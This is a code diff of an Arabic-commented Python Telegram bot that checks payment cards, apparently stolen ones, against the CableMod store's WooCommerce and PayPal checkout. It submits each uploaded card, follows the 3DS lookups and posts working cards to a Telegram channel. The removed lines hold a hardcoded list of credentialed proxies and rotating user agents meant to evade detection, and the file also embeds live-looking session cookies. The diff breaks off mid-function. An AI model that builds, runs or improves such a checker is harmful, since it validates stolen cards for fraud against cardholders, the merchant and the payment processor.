@@ -1,21 +1,19 @@
 # -*- coding: utf-8 -*-
 """
 CableMod + PayPal PPCP - Telegram Bot
-الحل النهائي: إضافة منتج للسلة قبل الـ checkout
-تم حل "فشل في استخراج update_order_review_nonce" 100%
+بوت تليجرام كامل لفحص البطاقات على موقع CableMod
 """
 
 import os
 import re
 import json
 import time
-import random
 import asyncio
+import threading
 import requests
 from datetime import datetime
 from urllib.parse import urlencode, unquote
 from typing import Optional, Dict, Tuple
-from itertools import cycle
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
@@ -27,35 +25,25 @@ CHANNEL_ID = -1003154179190
 
 # ====== إعدادات الموقع ======
 BASE_URL = "https://store.cablemod.com/"
-CART_URL = BASE_URL + "cart/"
 CHECKOUT_URL = BASE_URL + "checkout/"
-PRODUCT_ID = "1902265"  # منتج رخيص ومتوفر دايماً
-PRODUCT_URL = "https://store.cablemod.com/product/cablemod-classic-coiled-keyboard-cable-usb-a-to-usb-c-strawberry-cream/"
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
 
-# User Agents عشوائية
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
-]
-
-# الكوكيز الثابتة (مهمة جدًا!)
+# الكوكيز الثابتة
 INITIAL_COOKIES = {
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-    'sbjs_first_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%2010%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
-    '_fbp': 'fb.1.1761693482072.783059716330931642',
-    '_ga': 'GA1.1.543617456.1761693483',
+    'sbjs_current_add': 'fd%3D2025-10-29%2003%3A30%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.cablemod.com%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2025-10-29%2003%3A30%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.cablemod.com%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    '_fbp': 'fb.1.1761708631114.849070321437511942',
+    '_ga': 'GA1.1.823141992.1761708632',
+    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762918248%7CYdrLmoOaJVRAPuUQxvsIocmsmEmIK9U7Dt36uAg6LjC%7Cf93f09e32eb6e5b1b231f866e4b139366f7f7adaffe4c74d714568d234ada59d',
+    '_gcl_au': '1.1.1260044278.1761708631.1187310843.1761708642.1761708669',
     'woocommerce_items_in_cart': '1',
-    'woocommerce_recently_viewed': '1902265',
-    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762908222%7Cjsh0lltx9PceoroQvpEOSGJ37HkKuBm16eDRVujmwwjq%7C58f193d4befcde327b8e1a1c0d16308a4974ce1e013aa70c85fffedd81ffc6eb',
-    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1761866332%7C1761779932%7C%24generic%24FzmPQxa-1erHcRmPGoP-Y-huTFjZ7ndfiApBJIEk',
-    '_gcl_au': '1.1.1373112383.1761693482.1617057511.1761696403.1761698675',
-    'woocommerce_cart_hash': '59b29a9c285b9235836a077996070a0f',
+    'woocommerce_cart_hash': '0c256c5b280165ee7797d5da6cf2949b',
+    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1762313510%7C1761795110%7C%24generic%24zNpJHnVvxqPTf40fKcg9REZ_f7WuvPUGZk54aXkr',
+    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
+    '_ga_QYTKZE93WJ': 'GS2.1.s1761733879$o2$g1$t1761734601$j47$l0$h1976509677',
 }
 
 PAYPAL_COOKIES = {
@@ -99,137 +87,25 @@ SHIPPING = {
 
 PAYMENT_METHOD = "ppcp-credit-card-gateway"
 
-# ====== البروكسيات مدمجة (100 بروكسي) ======
-PROXIES_LIST = [
-    "82.21.224.53:6409:wikniadi:5nhj034pwe2b",
-    "82.29.229.58:6413:wikniadi:5nhj034pwe2b",
-    "82.25.216.252:7094:wikniadi:5nhj034pwe2b",
-    "23.27.184.56:5657:wikniadi:5nhj034pwe2b",
-    "23.27.138.191:6292:wikniadi:5nhj034pwe2b",
-    "82.22.210.10:7852:wikniadi:5nhj034pwe2b",
-    "23.27.184.66:5667:wikniadi:5nhj034pwe2b",
-    "82.21.224.144:6500:wikniadi:5nhj034pwe2b",
-    "23.27.138.3:6104:wikniadi:5nhj034pwe2b",
-    "82.24.224.121:5477:wikniadi:5nhj034pwe2b",
-    "23.27.138.52:6153:wikniadi:5nhj034pwe2b",
-    "23.27.138.7:6108:wikniadi:5nhj034pwe2b",
-    "82.25.216.253:7095:wikniadi:5nhj034pwe2b",
-    "82.29.225.124:5979:wikniadi:5nhj034pwe2b",
-    "82.29.225.234:6089:wikniadi:5nhj034pwe2b",
-    "46.203.159.11:6612:wikniadi:5nhj034pwe2b",
-    "23.27.184.19:5620:wikniadi:5nhj034pwe2b",
-    "82.25.216.58:6900:wikniadi:5nhj034pwe2b",
-    "82.29.229.17:6372:wikniadi:5nhj034pwe2b",
-    "82.29.225.147:6002:wikniadi:5nhj034pwe2b",
-    "82.25.216.82:6924:wikniadi:5nhj034pwe2b",
-    "82.29.225.162:6017:wikniadi:5nhj034pwe2b",
-    "82.22.220.147:5502:wikniadi:5nhj034pwe2b",
-    "82.29.226.49:7391:wikniadi:5nhj034pwe2b",
-    "82.22.217.78:5420:wikniadi:5nhj034pwe2b",
-    "82.29.226.142:7484:wikniadi:5nhj034pwe2b",
-    "23.27.184.34:5635:wikniadi:5nhj034pwe2b",
-    "82.22.210.191:8033:wikniadi:5nhj034pwe2b",
-    "46.203.159.219:6820:wikniadi:5nhj034pwe2b",
-    "82.24.224.176:5532:wikniadi:5nhj034pwe2b",
-    "82.24.224.214:5570:wikniadi:5nhj034pwe2b",
-    "82.29.226.141:7483:wikniadi:5nhj034pwe2b",
-    "23.27.138.141:6242:wikniadi:5nhj034pwe2b",
-    "46.203.159.243:6844:wikniadi:5nhj034pwe2b",
-    "82.29.225.96:5951:wikniadi:5nhj034pwe2b",
-    "23.27.138.4:6105:wikniadi:5nhj034pwe2b",
-    "82.21.224.55:6411:wikniadi:5nhj034pwe2b",
-    "23.27.138.174:6275:wikniadi:5nhj034pwe2b",
-    "82.22.220.98:5453:wikniadi:5nhj034pwe2b",
-    "82.25.216.243:7085:wikniadi:5nhj034pwe2b",
-    "23.27.184.65:5666:wikniadi:5nhj034pwe2b",
-    "82.21.224.157:6513:wikniadi:5nhj034pwe2b",
-    "23.27.184.126:5727:wikniadi:5nhj034pwe2b",
-    "82.22.220.19:5374:wikniadi:5nhj034pwe2b",
-    "66.63.180.86:5610:wikniadi:5nhj034pwe2b",
-    "82.29.225.186:6041:wikniadi:5nhj034pwe2b",
-    "82.27.214.80:6422:wikniadi:5nhj034pwe2b",
-    "82.21.224.4:6360:wikniadi:5nhj034pwe2b",
-    "82.22.210.232:8074:wikniadi:5nhj034pwe2b",
-    "23.27.138.106:6207:wikniadi:5nhj034pwe2b",
-    "82.29.226.36:7378:wikniadi:5nhj034pwe2b",
-    "82.29.226.25:7367:wikniadi:5nhj034pwe2b",
-    "82.29.226.157:7499:wikniadi:5nhj034pwe2b",
-    "82.22.217.47:5389:wikniadi:5nhj034pwe2b",
-    "82.24.224.150:5506:wikniadi:5nhj034pwe2b",
-    "82.27.214.169:6511:wikniadi:5nhj034pwe2b",
-    "82.29.226.160:7502:wikniadi:5nhj034pwe2b",
-    "82.21.224.129:6485:wikniadi:5nhj034pwe2b",
-    "23.27.138.102:6203:wikniadi:5nhj034pwe2b",
-    "82.22.217.21:5363:wikniadi:5nhj034pwe2b",
-    "82.29.225.57:5912:wikniadi:5nhj034pwe2b",
-    "82.22.217.251:5593:wikniadi:5nhj034pwe2b",
-    "82.25.216.216:7058:wikniadi:5nhj034pwe2b",
-    "46.203.159.236:6837:wikniadi:5nhj034pwe2b",
-    "82.22.210.148:7990:wikniadi:5nhj034pwe2b",
-    "82.22.210.117:7959:wikniadi:5nhj034pwe2b",
-    "82.21.224.110:6466:wikniadi:5nhj034pwe2b",
-    "82.22.217.246:5588:wikniadi:5nhj034pwe2b",
-    "23.27.184.248:5849:wikniadi:5nhj034pwe2b",
-    "46.203.159.89:6690:wikniadi:5nhj034pwe2b",
-    "46.203.159.145:6746:wikniadi:5nhj034pwe2b",
-    "82.27.214.125:6467:wikniadi:5nhj034pwe2b",
-    "82.22.220.158:5513:wikniadi:5nhj034pwe2b",
-    "82.22.217.234:5576:wikniadi:5nhj034pwe2b",
-    "82.22.220.208:5563:wikniadi:5nhj034pwe2b",
-    "82.22.210.222:8064:wikniadi:5nhj034pwe2b",
-    "82.25.216.172:7014:wikniadi:5nhj034pwe2b",
-    "82.25.216.37:6879:wikniadi:5nhj034pwe2b",
-    "82.29.225.168:6023:wikniadi:5nhj034pwe2b",
-    "82.24.224.238:5594:wikniadi:5nhj034pwe2b",
-    "82.25.216.201:7043:wikniadi:5nhj034pwe2b",
-    "23.27.138.224:6325:wikniadi:5nhj034pwe2b",
-    "82.21.224.116:6472:wikniadi:5nhj034pwe2b",
-    "82.22.220.43:5398:wikniadi:5nhj034pwe2b",
-    "82.29.225.240:6095:wikniadi:5nhj034pwe2b",
-    "82.21.224.119:6475:wikniadi:5nhj034pwe2b",
-    "82.24.224.202:5558:wikniadi:5nhj034pwe2b",
-    "82.22.210.91:7933:wikniadi:5nhj034pwe2b",
-    "82.22.210.79:7921:wikniadi:5nhj034pwe2b",
-    "82.29.226.220:7562:wikniadi:5nhj034pwe2b",
-    "23.27.184.224:5825:wikniadi:5nhj034pwe2b",
-    "82.21.224.251:6607:wikniadi:5nhj034pwe2b",
-    "82.29.225.230:6085:wikniadi:5nhj034pwe2b",
-    "23.27.184.40:5641:wikniadi:5nhj034pwe2b",
-    "23.27.184.77:5678:wikniadi:5nhj034pwe2b",
-    "82.29.226.113:7455:wikniadi:5nhj034pwe2b",
-    "82.22.217.83:5425:wikniadi:5nhj034pwe2b",
-    "66.63.180.183:5707:wikniadi:5nhj034pwe2b",
-    "82.27.214.77:6419:wikniadi:5nhj034pwe2b",
-    "82.24.224.249:5605:wikniadi:5nhj034pwe2b"
-]
-
-# ====== إعدادات البروكسي ======
-PROXIES_POOL = []
-PROXY_CYCLE = None
-PROXY_UPDATE_COUNTER = 0
-PROXY_UPDATE_INTERVAL = 50
-
-def load_random_proxies(count=30):
-    global PROXIES_POOL, PROXY_CYCLE
-    selected = random.sample(PROXIES_LIST, min(count, len(PROXIES_LIST)))
-    PROXIES_POOL = selected
-    PROXY_CYCLE = cycle(selected)
-    print(f"[+] تم تحميل {len(selected)} بروكسي عشوائي.")
-
-def get_current_proxy():
-    if PROXY_CYCLE is None:
-        load_random_proxies()
-    proxy_line = next(PROXY_CYCLE)
-    ip, port, user, pwd = proxy_line.split(':')
-    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
-    return {"http": proxy_url, "https": proxy_url}
-
 # ====== إحصائيات البوت ======
 stats = {
-    'total': 0, 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0,
-    'start_time': None, 'is_running': False, 'dashboard_message_id': None, 'chat_id': None,
-    'current_card': '', 'error_details': {}, 'last_response': 'Waiting...',
-    'cards_checked': 0, 'approved_cards': [], '3ds_cards': [], 'declined_cards': [],
+    'total': 0,
+    'checking': 0,
+    'approved': 0,
+    'rejected': 0,
+    'secure_3d': 0,
+    'errors': 0,
+    'start_time': None,
+    'is_running': False,
+    'dashboard_message_id': None,
+    'chat_id': None,
+    'current_card': '',
+    'error_details': {},
+    'last_response': 'Waiting...',
+    'cards_checked': 0,
+    'approved_cards': [],
+    '3ds_cards': [],
+    'declined_cards': [],
 }
 
 # ====== دالات مساعدة ======
@@ -244,7 +120,7 @@ def extract_nonces(html: str) -> Dict[str, Optional[str]]:
         or find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I)
     )
     nonces["process_checkout_nonce"] = (
-        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
+        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
         or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
     )
     nonces["ppcp_nonce"] = (
@@ -280,131 +156,46 @@ def parse_card(card_str: str) -> Tuple[str, str, str, str]:
         raise ValueError(f"الشهر غير صحيح: {month}")
     return number, cvv, year, month
 
-# ====== فئة معالجة الدفع (محدثة) ======
+# ====== فئة معالجة الدفع ======
 class WooCommercePayPal:
-    shared_nonces = {}
-    shared_paypal_token = None
-    shared_update_counter = 0
-    UPDATE_INTERVAL = 50
-
     def __init__(self):
         self.sess = requests.Session()
-        self.paypal_sess = requests.Session()
-
-        proxy = get_current_proxy()
-        self.sess.proxies.update(proxy)
-        self.paypal_sess.proxies.update(proxy)
-
-        from requests.adapters import HTTPAdapter
-        from urllib3.util.retry import Retry
-        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
-        adapter = HTTPAdapter(max_retries=retry)
-        self.sess.mount('http://', adapter)
-        self.sess.mount('https://', adapter)
-        self.paypal_sess.mount('http://', adapter)
-        self.paypal_sess.mount('https://', adapter)
-
         self.sess.cookies.update(INITIAL_COOKIES)
+        self.paypal_sess = requests.Session()
         self.paypal_sess.cookies.update(PAYPAL_COOKIES)
         self.nonces = {}
         self.paypal_token = None
         self.paypal_order_id = None
         self.client_metadata_id = None
-        self._load_shared_data()
-
-    def _load_shared_data(self):
-        if WooCommercePayPal.shared_nonces:
-            self.nonces = WooCommercePayPal.shared_nonces.copy()
-        if WooCommercePayPal.shared_paypal_token:
-            self.paypal_token = WooCommercePayPal.shared_paypal_token
-
-    def _save_shared_data(self):
-        WooCommercePayPal.shared_nonces = self.nonces.copy()
-        WooCommercePayPal.shared_paypal_token = self.paypal_token
-
-    def _needs_update(self):
-        return WooCommercePayPal.shared_update_counter % self.UPDATE_INTERVAL == 0
-
+        
     def headers_get(self):
         return {
-            "user-agent": random.choice(USER_AGENTS),
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "accept-language": "en-US,en;q=0.9",
-            "accept-encoding": "gzip, deflate, br",
-            "referer": BASE_URL,
-            "upgrade-insecure-requests": "1",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "same-origin",
-            "sec-fetch-user": "?1",
-            "connection": "keep-alive",
-            "cache-control": "max-age=0",
+            "user-agent": UA,
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
+            "referer": BASE_URL + "cart/",
         }
-
+    
     def headers_ajax(self, json_content=False):
         h = {
-            "user-agent": random.choice(USER_AGENTS),
+            "user-agent": UA,
             "accept": "*/*",
             "origin": BASE_URL.rstrip("/"),
             "referer": CHECKOUT_URL,
             "x-requested-with": "XMLHttpRequest",
-            "accept-language": "en-US,en;q=0.9",
+            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
         }
         h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
         return h
-
-    def step1_get_checkout(self, force=False):
-        if not force and self.nonces.get("update_order_review_nonce"):
-            return
-
-        # === 1. اذهب للمنتج ===
-        print("[*] جاري إضافة المنتج للسلة...")
-        r = self.sess.get(PRODUCT_URL, headers=self.headers_get(), timeout=30)
+    
+    def step1_get_checkout(self):
+        r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
         r.raise_for_status()
-
-        # === 2. أضف المنتج للسلة ===
-        add_to_cart_data = {
-            "add-to-cart": PRODUCT_ID,
-            "quantity": "1"
-        }
-        r = self.sess.post(PRODUCT_URL, data=add_to_cart_data, headers=self.headers_get(), timeout=30)
-        r.raise_for_status()
-
-        # === 3. اذهب للسلة ===
-        r = self.sess.get(CART_URL, headers=self.headers_get(), timeout=30)
-        r.raise_for_status()
-
-        # === 4. اضغط "Proceed to Checkout" ===
-        checkout_match = re.search(r'<a[^>]+href=["\']([^"\']*checkout[^"\']*)["\'][^>]*class=["\'][^"\']*checkout-button', r.text, re.I)
-        if checkout_match:
-            checkout_url = checkout_match.group(1)
-            if not checkout_url.startswith("http"):
-                checkout_url = BASE_URL.rstrip("/") + "/" + checkout_url.lstrip("/")
-            r = self.sess.get(checkout_url, headers=self.headers_get(), timeout=30)
-        else:
-            r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
-        
-        r.raise_for_status()
-        html = r.text
-
-        # === 5. استخرج الـ nonces ===
-        self.nonces = extract_nonces(html)
-
-        # === 6. لو مفيش → ريفريش مرة واحدة ===
+        self.nonces = extract_nonces(r.text)
         if not self.nonces.get("update_order_review_nonce"):
-            print("[!] مفيش update_order_review_nonce → جاري ريفريش...")
-            time.sleep(3)
-            r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
-            r.raise_for_status()
-            self.nonces = extract_nonces(r.text)
-
-        if not self.nonces.get("update_order_review_nonce"):
-            raise Exception("فشل في استخراج update_order_review_nonce بعد إضافة المنتج")
-
-        print(f"[+] تم استخراج update_order_review_nonce: {self.nonces['update_order_review_nonce']}")
-        self._save_shared_data()
-        return html
-
+            raise Exception("فشل في استخراج update_order_review_nonce")
+        return r.text
+    
     def step2_update_order_review(self):
         post_data = {
             "wc_order_attribution_source_type": "organic",
@@ -431,10 +222,8 @@ class WooCommercePayPal:
             return r.json()
         except:
             return None
-
-    def step3_get_paypal_token(self, force=False):
-        if not force and self.paypal_token:
-            return self.paypal_token
+    
+    def step3_get_paypal_token(self):
         html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
         fresh_nonces = extract_nonces(html)
         if fresh_nonces.get("ppcp_nonce"):
@@ -477,7 +266,7 @@ class WooCommercePayPal:
                         "&env=production&platform=desktop"
                     )
                     buttons_headers = {
-                        'user-agent': random.choice(USER_AGENTS),
+                        'user-agent': UA,
                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                         'referer': 'https://store.cablemod.com/',
                     }
@@ -491,11 +280,10 @@ class WooCommercePayPal:
                 except:
                     pass
             self.paypal_token = result
-            self._save_shared_data()
             return result
         except:
             raise
-
+    
     def step4_create_paypal_order(self):
         max_retries = 3
         for attempt in range(1, max_retries + 1):
@@ -589,7 +377,7 @@ class WooCommercePayPal:
                 raise Exception("Failed to create order")
         except:
             raise
-
+    
     def step5_confirm_payment(self, card_number: str, cvv: str, year: str, month: str):
         access_token = None
         if isinstance(self.paypal_token, dict):
@@ -615,10 +403,10 @@ class WooCommercePayPal:
         headers = {
             'accept': 'application/json',
             'content-type': 'application/json',
-            'user-agent': random.choice(USER_AGENTS),
+            'user-agent': UA,
             'origin': 'https://www.paypal.com',
             'referer': 'https://www.paypal.com/smart/card-field',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
             'dnt': '1',
             'priority': 'u=1, i',
             'sec-fetch-dest': 'empty',
@@ -655,12 +443,12 @@ class WooCommercePayPal:
             return result, payer_action_link
         except:
             raise
-
+    
     def step6_3ds_verification(self):
         headers = {
             'accept': '*/*',
             'content-type': 'application/json',
-            'user-agent': random.choice(USER_AGENTS),
+            'user-agent': UA,
             'origin': 'https://www.paypal.com',
             'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}',
         }
@@ -669,47 +457,45 @@ class WooCommercePayPal:
         ddc_jwt = r1.json().get("ddcJwtData")
         if ddc_jwt:
             self.paypal_sess.post('https://www.paypal.com/payment-authentication/threeds/v1/init-method',
-                                  headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': random.choice(USER_AGENTS)},
+                                  headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': UA},
                                   data={'JWT': ddc_jwt}, timeout=30)
         lookup_payload = {
             'token': self.paypal_order_id, 'action': 'verify',
-            'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'en', 'colorDepth': 24,
-                           'screenHeight': 535, 'screenWidth': 450, 'userAgent': random.choice(USER_AGENTS), 'timeZoneOffset': -180,
+            'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'ar', 'colorDepth': 24,
+                           'screenHeight': 535, 'screenWidth': 450, 'userAgent': UA, 'timeZoneOffset': -180,
                            'deviceInfo': 'COMPUTER'}
         }
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري Lookup النهائي...")
         r3 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
         res = r3.json()
+        status = res.get("threeDSStatus", "UNKNOWN")
+        auth_flow = res.get("authFlow", "UNKNOWN")
+        liability = res.get("liability_shift", "NO")
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] 3DS Status: {status}")
+        if status == "SUCCESS":
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] Auth Flow: FRICTIONLESS")
+            print(f"[{datetime.now().strftime('%H:%M:%S')}] Liability Shift: POSSIBLE")
         return res
 
 # ====== فحص البطاقة ======
 async def check_card(card: str, bot_app):
-    global PROXY_UPDATE_COUNTER
     try:
-        await asyncio.sleep(random.uniform(1, 3))
         card_number, cvv, year, month = parse_card(card)
         masked_card = f"{card_number[:6]}******{card_number[-4:]}"
         processor = WooCommercePayPal()
-        force_update = processor._needs_update()
-        processor.step1_get_checkout(force=force_update)
+        processor.step1_get_checkout()
         await asyncio.sleep(0.5)
         processor.step2_update_order_review()
         await asyncio.sleep(0.5)
-        processor.step3_get_paypal_token(force=force_update)
+        processor.step3_get_paypal_token()
         await asyncio.sleep(0.5)
         processor.step4_create_paypal_order()
         await asyncio.sleep(0.5)
         payment_result, payer_action_link = processor.step5_confirm_payment(card_number, cvv, year, month)
         status = payment_result.get("status", "UNKNOWN")
-
-        WooCommercePayPal.shared_update_counter += 1
-        PROXY_UPDATE_COUNTER += 1
-        if PROXY_UPDATE_COUNTER >= PROXY_UPDATE_INTERVAL:
-            load_random_proxies(30)
-            PROXY_UPDATE_COUNTER = 0
-            print(f"[+] تم تحديث البروكسيات (كل {PROXY_UPDATE_INTERVAL} بطاقة)")
-
         if status in ("APPROVED", "COMPLETED"):
             stats['approved'] += 1
+            stats['checking'] -= 1
             stats['last_response'] = 'SUCCESS'
             stats['approved_cards'].append(card)
             await update_dashboard(bot_app)
@@ -718,10 +504,11 @@ async def check_card(card: str, bot_app):
         elif status == "PAYER_ACTION_REQUIRED":
             await asyncio.sleep(0.5)
             lookup_result = processor.step6_3ds_verification()
-            status_3ds = lookup_result.get("threeDSStatus")
+            status_3ds = lookup_result.get("threeDSStatus")  # CHALLENGE_REQUIRED, DECLINED, SUCCESS
             liability = lookup_result.get("liability_shift", "NO")
             if status_3ds == "SUCCESS" and liability == "POSSIBLE":
                 stats['approved'] += 1
+                stats['checking'] -= 1
                 stats['last_response'] = 'SUCCESS'
                 stats['approved_cards'].append(card)
                 await update_dashboard(bot_app)
@@ -729,13 +516,22 @@ async def check_card(card: str, bot_app):
                 return card, "APPROVED", "Success"
             elif status_3ds == "CHALLENGE_REQUIRED":
                 stats['secure_3d'] += 1
+                stats['checking'] -= 1
                 stats['last_response'] = '3D CHALLENGE'
                 stats['3ds_cards'].append(card)
                 await update_dashboard(bot_app)
                 await send_to_channel(bot_app, card, "3D_SECURE", "CHALLENGE_REQUIRED")
                 return card, "3D_SECURE", "CHALLENGE_REQUIRED"
+            elif status_3ds == "DECLINED":
+                stats['rejected'] += 1
+                stats['checking'] -= 1
+                stats['last_response'] = 'DECLINED'
+                stats['declined_cards'].append(card)
+                await update_dashboard(bot_app)
+                return card, "DECLINED", "DECLINED"
             else:
                 stats['secure_3d'] += 1
+                stats['checking'] -= 1
                 stats['last_response'] = f'3DS: {status_3ds}'
                 stats['3ds_cards'].append(card)
                 await update_dashboard(bot_app)
@@ -743,6 +539,7 @@ async def check_card(card: str, bot_app):
                 return card, "3D_SECURE", status_3ds
         else:
             stats['rejected'] += 1
+            stats['checking'] -= 1
             stats['last_response'] = 'DECLINED'
             stats['declined_cards'].append(card)
             await update_dashboard(bot_app)
@@ -750,13 +547,11 @@ async def check_card(card: str, bot_app):
     except Exception as e:
         stats['errors'] += 1
         stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
+        stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
         stats['declined_cards'].append(card)
         await update_dashboard(bot_app)
         return card, "ERROR", str(e)
-    finally:
-        stats['checking'] -= 1
-        await update_dashboard(bot_app)
 
 # ====== إرسال للقناة ======
 async def send_to_channel(bot_app, card, status_type, message):
@@ -945,11 +740,9 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if stats['is_running']:
         await update.message.reply_text("يوجد فحص جاري!")
         return
-
     file = await update.message.document.get_file()
     file_content = await file.download_as_bytearray()
     cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
-
     stats.update({
         'total': len(cards),
         'checking': 0,
@@ -968,12 +761,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'is_running': True,
         'chat_id': update.effective_chat.id
     })
-
-    load_random_proxies(30)
-    global PROXY_UPDATE_COUNTER
-    PROXY_UPDATE_COUNTER = 0
-    WooCommercePayPal.shared_update_counter = 0
-
     dashboard_msg = await context.application.bot.send_message(
         chat_id=CHANNEL_ID,
         text="**CABLEMOD + PAYPAL CHECKER - LIVE**",
@@ -981,9 +768,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
     stats['dashboard_message_id'] = dashboard_msg.message_id
-
-    context.application.create_task(process_cards(cards, context.application))
-
     await update.message.reply_text(
         f"تم بدء الفحص!\n\n"
         f"إجمالي البطاقات: {len(cards)}\n"
@@ -991,6 +775,12 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"تابع النتائج في القناة",
